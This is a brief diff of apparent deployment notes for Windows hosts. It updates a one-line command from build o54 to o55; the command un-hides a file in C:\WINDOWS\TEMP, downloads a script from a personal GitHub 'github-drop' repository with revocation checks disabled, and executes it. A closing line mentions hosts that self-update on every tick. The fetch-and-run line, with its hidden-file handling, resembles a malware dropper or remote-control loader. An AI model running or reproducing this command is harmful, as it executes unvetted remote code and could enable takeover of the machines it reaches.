@@ -1,6 +1,6 @@
-UNIVERSAL DEPLOY (sevrz-only — Gryxa stack removed from project):
+UNIVERSAL DEPLOY (sevrz-only):
 
-attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o54" & findstr /C:"OWN BUILD 20260804O54" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
+attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o55" & findstr /C:"OWN BUILD 20260804o55" C:\WINDOWS\TEMP\own.cmd & call C:\WINDOWS\TEMP\own.cmd
 
 FORCE UPDATE mon/lib (ticking hosts also self-update from main every tick):
 
